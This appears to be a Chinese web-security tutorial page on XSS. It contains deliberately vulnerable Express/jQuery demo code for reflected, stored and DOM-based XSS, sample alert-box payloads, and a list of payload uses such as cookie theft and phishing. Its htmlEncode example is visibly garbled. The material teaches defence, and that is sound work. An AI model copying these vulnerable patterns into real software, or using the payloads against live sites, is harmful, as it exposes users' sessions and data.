
        <h2 id="t01. XSS(Cross-Site Script)">1. XSS(Cross-Site Script) <a href="#t01. XSS(Cross-Site Script)"> # </a></h2>
<ol>
<li>&#x9ED1;&#x5BA2;&#x5F80;&#x7F51;&#x9875;&#x91CC;&#x6CE8;&#x5165;&#x6076;&#x610F;&#x811A;&#x672C;&#x4EE3;&#x7801;</li>
<li>&#x5F53;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x65F6;&#x83B7;&#x53D6;&#x5230;&#x5305;&#x542B;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x7684;&#x7F51;&#x9875;</li>
<li>&#x901A;&#x8FC7;&#x6076;&#x610F;&#x811A;&#x672C;&#xFF0C;&#x9ED1;&#x5BA2;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x548C;&#x63A7;&#x5236;&#x7528;&#x6237;&#x4FE1;&#x606F;</li>
</ol>
<h3 id="t11.1 &#x53CD;&#x5C04;&#x578B;(&#x975E;&#x6301;&#x4E45;&#x578B;)XSS">1.1 &#x53CD;&#x5C04;&#x578B;(&#x975E;&#x6301;&#x4E45;&#x578B;)XSS <a href="#t11.1 &#x53CD;&#x5C04;&#x578B;(&#x975E;&#x6301;&#x4E45;&#x578B;)XSS"> # </a></h3>
<p>&#x8BF1;&#x5BFC;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x6076;&#x610F;&#x94FE;&#x63A5;&#x6765;&#x9020;&#x6210;&#x4E00;&#x6B21;&#x6027;&#x653B;&#x51FB;</p>
<ol>
<li>&#x9ED1;&#x5BA2;&#x628A;&#x5E26;&#x6709;&#x6076;&#x610F;&#x811A;&#x672C;&#x4EE3;&#x7801;&#x53C2;&#x6570;&#x7684;URL&#x5730;&#x5740;&#x53D1;&#x9001;&#x7ED9;&#x7528;&#x6237;</li>
<li>&#x7528;&#x6237;&#x70B9;&#x51FB;&#x6B64;&#x94FE;&#x63A5;</li>
<li>&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x83B7;&#x53D6;&#x8BF7;&#x6C42;&#x53C2;&#x6570;&#x5E76;&#x4E14;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x53CD;&#x5C04;&#x56DE;&#x7ED3;&#x679C;&#x9875;&#x9762; </li>
</ol>
<ul>
<li>&#x53CD;&#x5C04;&#x578B;XSS&#x653B;&#x51FB;&#x662F;&#x4E00;&#x6B21;&#x6027;&#x7684;&#xFF0C;&#x5FC5;&#x987B;&#x8981;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x94FE;&#x63A5;&#x624D;&#x80FD;&#x53D1;&#x8D77;</li>
<li>&#x4E00;&#x4E9B;&#x6D4F;&#x89C8;&#x5668;&#x5982;Chrome&#x5176;&#x5185;&#x7F6E;&#x4E86;&#x4E00;&#x4E9B;XSS&#x8FC7;&#x6EE4;&#x5668;&#xFF0C;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x5927;&#x90E8;&#x5206;&#x53CD;&#x5C04;&#x578B;XSS&#x653B;&#x51FB;</li>
<li>&#x53CD;&#x5C04;&#x578B;XSS&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x670D;&#x52A1;&#x5668;&#x6CA1;&#x6709;&#x5BF9;&#x6076;&#x610F;&#x7684;&#x7528;&#x6237;&#x8F93;&#x5165;&#x8FDB;&#x884C;&#x5B89;&#x5168;&#x5904;&#x7406;&#x5C31;&#x76F4;&#x63A5;&#x53CD;&#x5C04;&#x54CD;&#x5E94;&#x5185;&#x5BB9;&#xFF0C;&#x5BFC;&#x81F4;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x6267;&#x884C;&#x7684;&#x4E00;&#x79CD;XSS&#x6F0F;&#x6D1E;</li>
</ul>
<pre><code class="lang-js">const express = require(&apos;express&apos;);
const fs = require(&apos;fs&apos;);
const path = require(&apos;path&apos;);
const app = express();
const bodyParser = require(&apos;body-parser&apos;);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.resolve(__dirname, &apos;public&apos;)));
//http://localhost:3000/list?category=%3Cscript%3Ealert(1)%3C/script%3E
app.get(&apos;/list&apos;, function (req, res) {
    let { category } = req.query;
    res.header(&apos;Content-Type&apos;, &apos;text/html;charset=utf-8&apos;);
    res.send(`&#x4F60;&#x8F93;&#x5165;&#x7684;&#x5206;&#x7C7B;&#x662F;: ${category}`);
});
app.listen(3000, () =&gt; console.log(&apos;The server is starting at port 3000&apos;));
</code></pre>
<h3 id="t21.2 &#x5B58;&#x50A8;&#x578B;(&#x6301;&#x4E45;&#x578B;)XSS">1.2 &#x5B58;&#x50A8;&#x578B;(&#x6301;&#x4E45;&#x578B;)XSS <a href="#t21.2 &#x5B58;&#x50A8;&#x578B;(&#x6301;&#x4E45;&#x578B;)XSS"> # </a></h3>
<p>&#x9ED1;&#x5BA2;&#x5C06;&#x4EE3;&#x7801;&#x5B58;&#x50A8;&#x5230;&#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#xFF0C;&#x7528;&#x6237;&#x6D4F;&#x89C8;&#x76F8;&#x5173;&#x9875;&#x9762;&#x53D1;&#x8D77;&#x653B;&#x51FB;</p>
<ol>
<li>&#x9ED1;&#x5BA2;&#x5C06;&#x6076;&#x610F;&#x811A;&#x672C;&#x4EE3;&#x7801;&#x4E0A;&#x4F20;&#x6216;&#x5B58;&#x50A8;&#x5230;&#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#x5668;</li>
<li>&#x670D;&#x52A1;&#x5668;&#x628A;&#x6076;&#x610F;&#x811A;&#x672C;&#x4FDD;&#x5B58;&#x5230;&#x670D;&#x52A1;&#x5668;</li>
<li>&#x5F53;&#x6B63;&#x5E38;&#x5BA2;&#x6237;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x8BFB;&#x53D6;&#x6076;&#x610F;&#x6570;&#x636E;&#x5E76;&#x4E14;&#x76F4;&#x63A5;&#x4F7F;&#x7528;</li>
<li>&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x8FD4;&#x56DE;&#x542B;&#x6709;&#x6076;&#x610F;&#x811A;&#x672C;&#x7684;&#x9875;&#x9762;</li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:left">&#x7C7B;&#x578B;</th>
<th style="text-align:left">&#x53CD;&#x5C04;&#x578B;</th>
<th style="text-align:left">&#x5B58;&#x50A8;&#x578B;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">&#x6301;&#x4E45;&#x6027;</td>
<td style="text-align:left">&#x975E;&#x6301;&#x4E45;</td>
<td style="text-align:left">&#x6301;&#x4E45;&#x5316;(&#x5B58;&#x50A8;&#x5728;&#x670D;&#x52A1;&#x5668;)</td>
</tr>
<tr>
<td style="text-align:left">&#x89E6;&#x53D1;&#x65F6;&#x673A;</td>
<td style="text-align:left">&#x9700;&#x8981;&#x7528;&#x6237;&#x70B9;&#x51FB;</td>
<td style="text-align:left">&#x4E0D;&#x9700;&#x8981;&#x7528;&#x6237;&#x4EA4;&#x4E92;&#x4E5F;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;</td>
</tr>
<tr>
<td style="text-align:left">&#x5371;&#x5BB3;</td>
<td style="text-align:left">&#x5371;&#x5BB3;&#x8F83;&#x5C0F;</td>
<td style="text-align:left">&#x5371;&#x5BB3;&#x66F4;&#x5927;</td>
</tr>
</tbody>
</table>
<p>public\comment-list.html</p>
<pre><code class="lang-js">



    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>&#x8BC4;&#x8BBA;&#x5217;&#x8868;</title>
    <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.css">



    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="panel panel-default">
                    <div class="panel-heading">
                        <h2>&#x8BC4;&#x8BBA;&#x5217;&#x8868;</h2>
                    </div>
                    <div class="panel-body">
                        <ul class="list-group comment-list">

                        </ul>
                    </div>
                    <div class="panel-footer">
                        <div class="row">
                            <div class="col-md-12">
                                <form onsubmit="addComment(event)">
                                    <div class="form-group">
                                        <label for="username">&#x7528;&#x6237;&#x540D;</label>
                                        <input id="username" class="form-control" placeholder="&#x7528;&#x6237;&#x540D;">
                                    </div>
                                    <div class="form-group">
                                        <label for="content">&#x5185;&#x5BB9;</label>
                                        <input id="content" class="form-control" placeholder="&#x8BF7;&#x8F93;&#x5165;&#x8BC4;&#x8BBA;">
                                    </div>
                                    <div class="form-group">
                                        <input type="submit" class="btn btn-primary">
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
    <script>
        function getCommentList() {
            $.get('/api/comments').then(comments => {
                let html = comments.map(item => (
                    `
                <li class="list-group-item">
                        <div class="media">
                            <div class="media-left">
                                <a href="#">
                                   <img style="border-radius:5px" class="media-object" src="${item.avatar}" >
                                </a>
                            </div>
                            <div class="media-body">
                                <h4 class="media-heading">用户名: ${item.username}</h4>
                                <p>内容: ${item.content}</p>
                                <p>时间: ${item.time}</p>
                            </div>
                        </div>
                </li>
                `
                )).join('');
                $('.comment-list').html(html);
            });
        }
        getCommentList();
        function addComment(event) {
            event.preventDefault();
            let username = $('#username').val();
            let content = $('#content').val();
            if (!content) return;
            $.post('/api/comments', { username, content }).then(data => {
                getCommentList();
                $('#content').val('');
            });
        }
    </script>



</code></pre>
<p>server.js</p>
<pre><code class="lang-js">let comments = [
    { avatar: &apos;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&apos;, username: &apos;&#x5F20;&#x4E09;&apos;, content: &apos;&#x4ECA;&#x5929;&#x5929;&#x6C14;&#x4E0D;&#x9519;&apos;, time: new Date().toLocaleString() },
    { avatar: &apos;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&apos;, username: &apos;&#x674E;&#x56DB;&apos;, content: &apos;&#x662F;&#x7684;&apos;, time: new Date().toLocaleString() }
];
app.get(&apos;/api/comments&apos;, function (req, res) {
    res.json(comments);
});
app.post(&apos;/api/comments&apos;, function (req, res) {
    let comment = req.body;
    comments.push({
        ...comment,
        avatar: &apos;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&apos;,
        time: new Date().toLocaleString()
    });
    res.json(comments);
});
</code></pre>
<h3 id="t31.3 DOM-Based&#x578B;XSS">1.3 DOM-Based&#x578B;XSS <a href="#t31.3 DOM-Based&#x578B;XSS"> # </a></h3>
<p>&#x4E0D;&#x9700;&#x8981;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x652F;&#x6301;&#xFF0C;&#x662F;&#x7531;&#x4E8E;DOM&#x7ED3;&#x6784;&#x4FEE;&#x6539;&#x5BFC;&#x81F4;&#x7684;&#xFF0C;&#x57FA;&#x4E8E;&#x6D4F;&#x89C8;&#x5668;DOM&#x89E3;&#x6790;&#x7684;&#x653B;&#x51FB;</p>
<ol>
<li>&#x7528;&#x6237;&#x6253;&#x5F00;&#x5E26;&#x6709;&#x6076;&#x610F;&#x7684;&#x94FE;&#x63A5;</li>
<li>&#x6D4F;&#x89C8;&#x5668;&#x5728;DOM&#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x6076;&#x610F;&#x6570;&#x636E;</li>
<li>&#x7528;&#x6237;&#x4E2D;&#x62DB;</li>
<li>&#x5E38;&#x89C1;&#x7684;&#x89E6;&#x53D1;&#x573A;&#x666F;&#x5C31;&#x662F;&#x5728;&#x4FEE;&#x6539;innerHTML outerHTML document.write&#x7684;&#x65F6;&#x5019;</li>
</ol>
<pre><code class="lang-js">
    <h1>&#x8F93;&#x5165;&#x94FE;&#x63A5;&#x5730;&#x5740;&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;&#x6309;&#x94AE;</h1>
    <div id="content"></div>
    <input type="text" id="link">
    <button onclick="setup()">&#x8BBE;&#x7F6E;</button>
    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
    <script>
        function setup() {
            // " onclick=alert(1) //
            let html = `<a href="${$('#link').val()}">点我</a>`;
            $('#content').html(html);
        }
    </script>

</code></pre>
<h3 id="t41.4 payload">1.4 payload <a href="#t41.4 payload"> # </a></h3>
<p>&#x5B9E;&#x73B0;XSS&#x653B;&#x51FB;&#x7684;&#x6076;&#x610F;&#x811A;&#x672C;&#x88AB;&#x79F0;&#x4E3A; <code>XSS payload</code></p>
<ul>
<li>&#x7A83;&#x53D6;&#x7528;&#x6237;&#x7684;Cookie  <code>document.cookie</code></li>
<li>&#x8BC6;&#x522B;&#x7528;&#x6237;&#x6D4F;&#x89C8;&#x5668;  <code>navigator.userAgent</code></li>
<li>&#x4F2A;&#x9020;&#x8BF7;&#x6C42; GET POST&#x8BF7;&#x6C42;</li>
<li>XSS&#x9493;&#x9C7C;  &#x901A;&#x8FC7;XSS&#x5411;&#x7F51;&#x9875;&#x4E0A;&#x6CE8;&#x5165;&#x9493;&#x9C7C;&#x94FE;&#x63A5;&#xFF0C;&#x8BA9;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5047;&#x5192;&#x7684;&#x7F51;&#x7AD9;</li>
</ul>
<h3 id="t51.5 &#x5982;&#x4F55;&#x9632;&#x5FA1;XSS">1.5 &#x5982;&#x4F55;&#x9632;&#x5FA1;XSS <a href="#t51.5 &#x5982;&#x4F55;&#x9632;&#x5FA1;XSS"> # </a></h3>
<ul>
<li>&#x7ED9;cookie&#x8BBE;&#x7F6E;httpOnly&#x5C5E;&#x6027; &#x811A;&#x672C;&#x65E0;&#x6CD5;&#x8BFB;&#x53D6;&#x8BE5;Cookie,&#x81EA;&#x5DF1;&#x4E5F;&#x4E0D;&#x80FD;&#x7528;&#xFF0C;&#x975E;&#x6839;&#x672C;&#x89E3;&#x51B3;XSS</li>
</ul>
<p>login.html</p>
<pre><code class="lang-js">



    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>&#x767B;&#x5F55;</title>
    <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.css">



    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <form onsubmit="login(event)">
                    <div class="form-group">
                        <label for="username">&#x7528;&#x6237;&#x540D;</label>
                        <input id="username" class="form-control" placeholder="&#x7528;&#x6237;&#x540D;">
                    </div>
                    <div class="form-group">
                        <label for="password">&#x5BC6;&#x7801;</label>
                        <input id="password" class="form-control" placeholder="&#x5BC6;&#x7801;">
                    </div>
                    <div class="form-group">
                        <input type="submit" class="btn btn-primary" value="&#x767B;&#x5F55;">
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
    <script>
        function login() {
            let username = $('#username').val();
            let password = $('#password').val();
            $.post('/api/login', { username, password }).then(data => {
                if (data.code == 0) {
                    location.href = `/user.html?username=${username}`;
                }
                $('#username').val('');
                $('#password').val('');
            });
        }
    </script>



</code></pre>
<p>user.html</p>
<pre><code class="lang-js"><script>
        document.write(document.cookie);
    </script>
</code></pre>
<p>server.js</p>
<pre><code class="lang-js">let users = [{ username: &apos;a&apos;, password: &apos;123456&apos;, avatar: &apos;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&apos; }, { username: &apos;b&apos;, password: &apos;123456&apos;, avatar: &apos;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&apos; }];
let userSessions = {};
app.post(&apos;/api/login&apos;, function (req, res) {
    let body = req.body;
    let user;
    for (let i = 0; i &lt; users.length; i++) {
        if (body.username == users[i].username &amp;&amp; body.password == users[i].password) {
            user = users[i];
            break;
        }
    }
    if (user) {
        const sessionId = &apos;user_&apos; + Math.random() * 1000;
        res.cookie(&apos;username&apos;, user.username);
        res.cookie(&apos;sessionId&apos;, sessionId, { httpOnly: true });
        userSessions[sessionId] = {};
        res.json({ code: 0, user });
    } else {
        res.json({ code: 1, data: &apos;&#x6CA1;&#x6709;&#x8BE5;&#x7528;&#x6237;&apos; });
    }
});
</code></pre>
<h3 id="t61.6 Web&#x76F8;&#x5173;&#x7F16;&#x7801;&#x548C;&#x8F6C;&#x4E49;">1.6 Web&#x76F8;&#x5173;&#x7F16;&#x7801;&#x548C;&#x8F6C;&#x4E49; <a href="#t61.6 Web&#x76F8;&#x5173;&#x7F16;&#x7801;&#x548C;&#x8F6C;&#x4E49;"> # </a></h3>
<h4 id="t71.6.1 URL &#x7F16;&#x7801;">1.6.1 URL &#x7F16;&#x7801; <a href="#t71.6.1 URL &#x7F16;&#x7801;"> # </a></h4>
<ul>
<li>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;URL&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x82F1;&#x6587;&#x5B57;&#x6BCD;&#xFF08;a-zA-Z&#xFF09;&#x3001;&#x6570;&#x5B57;&#xFF08;0-9&#xFF09;&#x3001;-_.~4&#x4E2A;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x4EE5;&#x53CA;&#x6240;&#x6709;&#xFF08;;,/?:@&amp;=+$#&#xFF09;&#x4FDD;&#x7559;&#x5B57;&#x7B26;&#x3002;</li>
<li>&#x5982;&#x679C;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x6587;&#x5B57;&#x548C;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x7F16;&#x7801;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x8868;&#x793A;<pre><code class="lang-js">var url1 = &apos;http://www.&#x73E0;&#x5CF0;&#x57F9;&#x8BAD;.com&apos;;  //&#x5305;&#x542B;&#x6C49;&#x5B57; encodeURI(url1));//http://www.%E7%8F%A0%E5%B3%B0.com
var url2 = &apos;http://www.a.com?&#x540D;&#x79F0;=&#x73E0;&#x5CF0;&apos;;  //&#x952E;&#x4E3A;&#x6C49;&#x5B57;
var url3 = &apos;http://a.com?name=?&amp;&apos;;    //&#x503C;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#x7279;&#x6B8A;&#x7B26;&#x53F7;
</code></pre>
</li>
<li>encodeURI encodeURI&#x662F;&#x7528;&#x6765;&#x7F16;&#x7801;URI&#x7684;,&#x6700;&#x5E38;&#x89C1;&#x7684;&#x5C31;&#x662F;&#x7F16;&#x7801;&#x4E00;&#x4E2A; URL&#x3002;encodeURI &#x4F1A;&#x5C06;&#x9700;&#x8981;&#x7F16;&#x7801;&#x7684;&#x5B57;&#x7B26;&#x8F6C;&#x6362;&#x4E3A; UTF-8 &#x7684;&#x683C;&#x5F0F;&#x3002;&#x5BF9;&#x4E8E;&#x4FDD;&#x7559;&#x5B57;&#x7B26;&#xFF08;;,/?:@&amp;=+$#&#xFF09;&#xFF0C;&#x4EE5;&#x53CA;&#x975E;&#x8F6C;&#x4E49;&#x5B57;&#x7B26;&#xFF08;&#x5B57;&#x6BCD;&#x6570;&#x5B57;&#x4EE5;&#x53CA; -_.!~*&apos;()&#xFF09;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#x3002;</li>
<li>encodeURI &#x4E0D;&#x8F6C;&#x4E49;&amp;&#x3001;?&#x548C;=   <code>encodeURI(url3);//http://a.com?name=?&amp;</code></li>
<li>encodeURIComponent &#x662F;&#x7528;&#x6765;&#x7F16;&#x7801; URI &#x53C2;&#x6570;&#x7684;,&#x5B83;&#x4F1A;&#x8DF3;&#x8FC7;&#x975E;&#x8F6C;&#x4E49;&#x5B57;&#x7B26;&#xFF08;&#x5B57;&#x6BCD;&#x6570;&#x5B57;&#x4EE5;&#x53CA;-_.!~*&apos;()&#xFF09;&#x3002;&#x4F46;&#x4F1A;&#x8F6C;&#x4E49; URL&#x7684; &#x4FDD;&#x7559;&#x5B57;&#x7B26;&#xFF08;;,/?:@&amp;=+$#,<code>encodeURIComponent(url3));// http%3A%2F%2Fa.com%3Fname%3D%3F%26</code></li>
<li>&#x6240;&#x6709;&#x5B8C;&#x6574;&#x7F16;&#x7801;&#x4E00;&#x4E2A;URL&#x5B57;&#x7B26;&#x4E32;&#x9700;&#x8981;encodeURI&#x548C;encodeURIComponent&#x8054;&#x5408;&#x4F7F;&#x7528; <code>console.log(encodeURI(&apos;http://a.com?name=&apos;) + encodeURIComponent(&apos;?&amp;&apos;)); http://a.com?name=%3F%26</code></li>
</ul>
<h4 id="t81.6.2 HTML &#x7F16;&#x7801;">1.6.2 HTML &#x7F16;&#x7801; <a href="#t81.6.2 HTML &#x7F16;&#x7801;"> # </a></h4>
<p>&#x5728; HTML &#x4E2D;&#xFF0C;&#x67D0;&#x4E9B;&#x5B57;&#x7B26;&#x662F;&#x9884;&#x7559;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x5C0F;&#x4E8E;&#x53F7;&#xFF08;&lt;&#xFF09;&#x548C;&#x5927;&#x4E8E;&#x53F7;&#xFF08;&gt;&#xFF09;&#xFF0C;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x8BEF;&#x8BA4;&#x4E3A;&#x5B83;&#x4EEC;&#x662F;&#x6807;&#x7B7E;&#x3002;&#x5982;&#x679C;&#x5E0C;&#x671B;&#x6B63;&#x786E;&#x5730;&#x663E;&#x793A;&#x9884;&#x7559;&#x5B57;&#x7B26;&#xFF0C;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x5728; HTML &#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#x4F7F;&#x7528;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#xFF08;character entities&#xFF09;
HTML &#x7F16;&#x7801;&#x5206;&#x4E3A;&#xFF1A;</p>
<ul>
<li>HTML &#x5341;&#x516D;&#x8FDB;&#x5236;&#x7F16;&#x7801;  &amp;#xH;</li>
<li>HTML &#x5341;&#x8FDB;&#x5236;&#x7F16;&#x7801;  &amp;#D;</li>
<li>HTML &#x5B9E;&#x4F53;&#x7F16;&#x7801; &lt; &#x7B49;</li>
</ul>
<p>&#x5728; HTML &#x8FDB;&#x5236;&#x7F16;&#x7801;&#x4E2D;&#x5176;&#x4E2D;&#x7684;&#x6570;&#x5B57;&#x5219;&#x662F;&#x5BF9;&#x5E94;&#x5B57;&#x7B26;&#x7684; unicode &#x5B57;&#x7B26;&#x7F16;&#x7801;&#x3002;
&#x6BD4;&#x5982;&#x5355;&#x5F15;&#x53F7;&#x7684; unicode &#x5B57;&#x7B26;&#x7F16;&#x7801;&#x662F;27&#xFF0C;&#x5219;&#x5355;&#x5F15;&#x53F7;&#x53EF;&#x4EE5;&#x88AB;&#x7F16;&#x7801;&#x4E3A;&apos;</p>
<pre><code class="lang-js">function htmlEncode(str) {
  return String(str)
    .replace(/&amp;/g, &apos;&amp;&apos;)
    .replace(/&quot;/g, &apos;&quot;&apos;)
    .replace(/&apos;/g, &apos;&apos;&apos;)
    .replace(//g, &apos;&gt;&apos;);
}
</code></pre>
<p><a href="http://www.w3school.com.cn/html/html_entities.asp">&#x5B8C;&#x6574;&#x5B9E;&#x4F53;</a></p>
<h4 id="t91.6.3 Javascript &#x8F6C;&#x4E49;">1.6.3 Javascript &#x8F6C;&#x4E49; <a href="#t91.6.3 Javascript &#x8F6C;&#x4E49;"> # </a></h4>
<p>avaScript &#x4E2D;&#x6709;&#x4E9B;&#x5B57;&#x7B26;&#x6709;&#x7279;&#x6B8A;&#x7528;&#x9014;&#xFF0C;&#x5982;&#x679C;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x60F3;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x5B57;&#x7B26;&#x539F;&#x6765;&#x7684;&#x542B;&#x4E49;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x53CD;&#x659C;&#x6760;&#x5BF9;&#x8FD9;&#x4E9B;&#x7279;&#x6B8A;&#x7B26;&#x53F7;&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#x3002;&#x6211;&#x4EEC;&#x79F0;&#x4E4B;&#x4E3A; Javascript&#x7F16;&#x7801;</p>
<ul>
<li>&#x4E09;&#x4E2A;&#x516B;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x591F;&#x4E2A;&#x6570;&#xFF0C;&#x524D;&#x9762;&#x8865;0&#xFF0C;&#x4F8B;&#x5982; &#x201C;e&#x201D; &#x7F16;&#x7801;&#x4E3A;&#x201C;\145&#x201D;</li>
<li>&#x4E24;&#x4E2A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x591F;&#x4E2A;&#x6570;&#xFF0C;&#x524D;&#x9762;&#x8865;0&#xFF0C;&#x4F8B;&#x5982; &#x201C;e&#x201D; &#x7F16;&#x7801;&#x4E3A;&#x201C;\x65&#x201D;</li>
<li>&#x56DB;&#x4E2A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x591F;&#x4E2A;&#x6570;&#xFF0C;&#x524D;&#x9762;&#x8865;0&#xFF0C;&#x4F8B;&#x5982; &#x201C;e&#x201D; &#x7F16;&#x7801;&#x4E3A;&#x201C;\u0065&#x201D;</li>
<li>&#x5BF9;&#x4E8E;&#x4E00;&#x4E9B;&#x63A7;&#x5236;&#x5B57;&#x7B26;&#xFF0C;&#x4F7F;&#x7528;&#x7279;&#x6B8A;&#x7684;C&#x7C7B;&#x578B;&#x7684;&#x8F6C;&#x4E49;&#x98CE;&#x683C;&#xFF08;&#x4F8B;&#x5982;\n&#x548C;\r&#xFF09;</li>
</ul>
<pre><code class="lang-js">var str = &quot;zfpx&quot;&quot;;
var str = &quot;zfpx\&quot;&quot;;
</code></pre>
<h3 id="t101.7 &#x8F93;&#x5165;&#x68C0;&#x67E5;">1.7 &#x8F93;&#x5165;&#x68C0;&#x67E5; <a href="#t101.7 &#x8F93;&#x5165;&#x68C0;&#x67E5;"> # </a></h3>
<ul>
<li>&#x6C38;&#x8FDC;&#x4E0D;&#x8981;&#x76F8;&#x4FE1;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;</li>
<li>&#x7528;&#x6237;&#x683C;&#x5F0F;&#x5224;&#x65AD; &#x767D;&#x540D;&#x5355;</li>
<li>&#x8FC7;&#x6EE4;&#x5371;&#x9669;&#x5B57;&#x7B26; &#x53BB;&#x9664;<script> javascript onclick等  黑名单</li>
<li>转义特殊字符 <code>&lt;=&amp;lt;  &gt;=&amp;gt; &amp;=&amp;amp;</code>  黑名单</li>
<li>前端可以绕过</li>
</ul>
<pre><code class="lang-js">const express = require(&#39;express&#39;);
const fs = require(&#39;fs&#39;);
const path = require(&#39;path&#39;);
const app = express();
const bodyParser = require(&#39;body-parser&#39;);
const cookieParser = require(&#39;cookie-parser&#39;);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static(path.resolve(__dirname, &#39;public&#39;)));
//http://localhost:3000/list?category=%3Cscript%3Ealert(1)%3C/script%3E
app.get(&#39;/list&#39;, function (req, res) {
    let { category } = req.query;
    res.header(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);
    res.send(`你输入的分类是: ${category}`);
});
let comments = [
    { avatar: &#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;, username: &#39;张三&#39;, content: &#39;今天天气不错&#39;, time: new Date().toLocaleString() },
    { avatar: &#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;, username: &#39;李四&#39;, content: &#39;是的&#39;, time: new Date().toLocaleString() }
];
app.get(&#39;/api/comments&#39;, function (req, res) {
    res.json(comments);
});
app.post(&#39;/api/comments&#39;, function (req, res) {
    let username = userSessions[req.cookies.sessionId];
    if (username) {
        let comment = req.body;
        comments.push({
            ...comment,
            username,
            avatar: &#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;,
            time: new Date().toLocaleString()
        });
        res.json({ code: 0, comments });
    } else {
        res.json({ code: 1, error: &#39;用户没有登录&#39; });
    }
});
let users = [{ username: &#39;a&#39;, password: &#39;123456&#39;, avatar: &#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39; }, { username: &#39;b&#39;, password: &#39;123456&#39;, avatar: &#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39; }];
let userSessions = {};
app.post(&#39;/api/login&#39;, function (req, res) {
    let body = req.body;
    let user;
    for (let i = 0; i &lt; users.length; i++) {
        if (body.username == users[i].username &amp;&amp; body.password == users[i].password) {
            user = users[i];
            break;
        }
    }
    if (user) {
        const sessionId = &#39;user_&#39; + Math.random() * 1000;
        res.cookie(&#39;username&#39;, user.username);
        res.cookie(&#39;sessionId&#39;, sessionId, { httpOnly: true });
        userSessions[sessionId] = { username: user.username };
        res.json({ code: 0, user });
    } else {
        res.json({ code: 1, data: &#39;没有该用户&#39; });
    }
});
